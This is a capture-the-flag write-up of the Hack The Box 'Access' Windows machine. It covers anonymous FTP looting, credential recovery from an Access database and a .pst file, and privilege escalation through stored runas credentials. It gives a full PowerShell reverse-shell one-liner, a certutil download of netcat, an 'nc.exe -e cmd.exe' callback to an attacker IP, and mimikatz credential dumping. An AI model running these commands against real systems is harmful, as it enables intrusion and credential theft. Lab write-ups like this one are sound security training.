# Key Takeaways
- Using a script to run through interesting files/folders in accessible home directories may yield useful information. (root.txt)
- When utilities (like runas) are not returning errors and feedback, confirm their functionality with simple commands that are known to work before trying more finnicky syntax. (root.txt)
- When forced to utilize unideal shell environments, focus effort initially on upgrading the shell to something more usable. (root.txt)

# Overview
- Platform: Windows
- HTB Rating: Easy - Medium

### Vulnerabilities
- An FTP service was left open to Anonymous access, allowing an attacker to gain useful information from the documents inside.
- Telnet usage should generally be replaced with SSH as the unecrypted communication of Telnet is unideal for production environments.
- Locally stored Admin credentials provide an easy vector for privilege escalation via the Runas.exe Windows utility. A service account should be used in place of giving the user full access to stored Admin credentials.
- Windows Server 2008 is long outdated and is no longer receiving security updates.

### Strengths
- Group policy is being used as an app-blocking solution as a **whitelist**, disallowing many Windows utilities and newly downloaded executables that could be used maliciously.

# Solving user.txt
We start off the machine with only the IP, so I began with the typical nmap scans to look for open TCP and UDP ports.
```
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
```

That FTP server looks very interesting as it appears we have anonymous access. However, I like to begin running scans for interesting directories, files, and vhosts while I work on other things, so I pointed `fuff` at port 80 first. These scans returned nothing of note.

I then turned my attention toward the FTP server, logging in as Anonymous and without a password. This seems like a very strong lead, as we are able to find a `backup.mdb` file and a `Access Control.zip` archive.
<img width="478" height="331" alt="image" src="https://github.com/user-attachments/assets/31bd98f0-57d5-4fd9-a88e-c9afd7387bc6" />

_FTP server with .mdb and .zip files_

Due to the types of files we are transferring, I first switched the FTP transfer mode to binary using the command `binary`. The files were then transferred via the `get` command.

I initially tried to simply unzip the archive, however it gave me the message "unsupported compression method 99". A quick Google search verified that this usually means it is an encrypted archive. While I likely should have moved onto the .mdb file at this point, I initially decided to try cracking the zip password. To do this, I used `zip2john Access\ Control.zip > ziphash.txt` and then ran that zip file through Hashcat— this did not crack the password.

I then moved on the .mdb file. I didn't really know what this file type was, so I first did some research. It appears to be a Microsoft Access database file, and there is a handy library that can be used on Linux to interact with it: [mdbtools](https://github.com/mdbtools/mdbtools). This can be installed easily with `apt install mdbtools`.

I first listed the tables of the database using `mdb-tables backup.mdb`. From this list, the one that stood out as the most interesting target was the auth-users table. I dumped the information from that table using `mdb-json backup.mdb auth_user`. We got some usernames and passwords from that.
```json
└──╼ $mdb-json backup.mdb auth_user
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"accessXXXXXXXXXX","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
```

I tried all of these username and password combinations to log into telnet first, however the one that would have worked (engineer) was not in the TelnetClients group, so we couldn't get a connection. This did however tell us that we had a working username and password in case we needed it later.

Next, I tried using the most unique password we found (the one for the engineer user) as the password for the zip archive. This did allow us to successfully extract the archive with 7zip: `7z x Access\ Control.zip`.

Extracting this archive reveals a .pst file inside, again something I am unfamiliar with. Doing some research, this seems to be a Personal Storage Table, and is used to store messages, emails, etc. While there are numerous utilities to view the items in a .pst file, I went the route of installing Evolution and importing the file. Evolution can be installed quickly with `apt install evolution`. The file can then be imported via File > Import... > Import a single file > Choose the file and import. This yielded the following email:
```
Hi there,

The password for the “security” account has been changed to 4Cc3ssXXXXXXXXXX.  Please ensure this is passed on to your engineers.

Regards,

John
```

These credentials get us into the machine via telnet, where we are then able to grab the user.txt flag.
<img width="376" height="277" alt="image" src="https://github.com/user-attachments/assets/1633a755-740b-468a-9e69-deec71982755" />

_Using the found credentials to get a telnet session and retrieve user.txt_

# Solving root.txt
For whatever reason, I spent too much time here getting annoyed at the telnet shell (not being able to backspace for one) before realizing that I should just upgrade to a better shell via a reverse shell. After some inital enumeration, I eventually setup a reverse shell from the Security user, making my life a little bit easier.
```bash
nc -lvnp 4445
```
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.XX.XX',4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

As I enumerated the machine for possible privilege escalation vectors, I took note of the fact that there seemed to be some group policy in play that was whitelisting apps and executables, making it more difficult to run enumeration tools from the Security user. Eventually, I ran the `cmdkey /list` command and found that there are stored Administrator credentials, something that can very easily escalate our privileges, often by using the `runas.exe` utility.

<img width="426" height="148" alt="image" src="https://github.com/user-attachments/assets/ff19d106-439c-4cf6-9235-b0d803557641" />

_Administrator credentials stored in the Windows Credential Manager_

It should be noted that it took me a bit of time to run the necessary command to spot these credentials. That said, the creator of this challenge did leave a unique hint in the form of a `ZKAccess3.5 Security System.lnk` file in the `C:\Users\Public\Desktop\` directory which I didn't see on my first run through. It is possible to pull strings out of .lnk files to see what kind of information they have. Running a command like the following would have let us know that we should be looking to use the `runas.exe` command to use stored Admin credentials: `findstr /R /N "." "ZKAccess3.5 Security System.lnk"`.
```
1:L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?M?:*wWindowsV1MV?System32???:?MV?*?System32X2P?:?
                                                                                                          runas.exe???:1??:1?*Yrunas.exeL-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
                                                                                                                                 ?wN??]N?D.??Q???`?Xaccess?_???8{E?3
      O?j)?H???
               )??[?_???8{E?3
                             O?j)?H???
                                      )??[?     ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500
```

In the future, it may be worth making a quick run through each file in the first couple layers of any accessible folders in the C:\Users\ directory. I created the following PowerShell one-liner to enumerate all files in this directory with some recursion.
```powershell
$outFile = ".\userfiles.txt"; Remove-Item $outFile -ErrorAction SilentlyContinue; $basePath = "C:\Users"; $results = @(); Get-ChildItem -Path $basePath -Force -ErrorAction SilentlyContinue | ForEach-Object {$results += $_; if ($_.PSIsContainer) {Get-ChildItem -Path $_.FullName -Force -ErrorAction SilentlyContinue | ForEach-Object {$results += $_; if ($_.PSIsContainer) {Get-ChildItem -Path $_.FullName -Force -ErrorAction SilentlyContinue | ForEach-Object {$results += $_}}}}}; $results = $results | Sort-Object FullName; foreach ($item in $results) {$depth = ($item.FullName -split "\\").Count - 3; if ($depth -lt 0) { $depth = 0 }; $indent = "--" * $depth; $line = "$indent $($item.FullName)"; Write-Host $line; Add-Content -Path $outFile -Value $line}
```

At this point, we have stored Admin credentials and can use them via the runas command. I kept running into issues with getting a shell as Administrator via the runas command, and the lack of errors was not helping. The easiest thing to do here is to simply use `runas.exe` to read root.txt and pipe it into a location we can read, as shown below.
```cmd
runas.exe /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Security\root.txt"
```
<img width="1259" height="63" alt="image" src="https://github.com/user-attachments/assets/8dbda07b-d47b-4a5a-ad49-5b059f3d41d3" />

_Reading root.txt_

# Decrypting the Administrator password
It felt a little wrong to only get the root flag since the credentials were sitting right there behind DPAPI, so I went back to trying to get a shell so that I could work on decrypting the password. I continued to have issues getting a powershell command to work when wrapped within the runas command. To work around that, I first uploaded netcat to the server with certutil and a python webserver.
```
python3 -m http.server 8081
```
```
certutil.exe -urlcache -f http://10.10.XX.XX:8081/nc.exe nc.exe
```

I then used this netcat executable alongside `runas.exe` to get a shell as the Administrator account.
```
runas /user:Administrator /savecred "nc.exe -e cmd.exe 10.10.XX.XX 4445"
```
<img width="521" height="214" alt="image" src="https://github.com/user-attachments/assets/01382220-5422-4962-bf3a-e470bdc4cfd9" />

Finally, I transferred a mimikatz executable from my attacking machine in the same way I did with netcat. I then ran mimikatz as the Administrator user and executed the credman module which is able to show us the stored credentials in plaintext.
```
C:\Users\security\Desktop>.\mimikatz.exe

  .#####.   mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

<SNIP>

Authentication Id : 0 ; 6949018 (00000000:006a089a)
Session           : Interactive from 0
User Name         : security
Domain            : ACCESS
Logon Server      : ACCESS
Logon Time        : 12/20/2025 2:07:43 AM
SID               : S-1-5-21-953262931-566350628-63446256-1001
        credman :
         [00000000]
         * Username : ACCESS\Administrator
         * Domain   : ACCESS\Administrator
         * Password : 55Acc3ss<REDACTED>
```
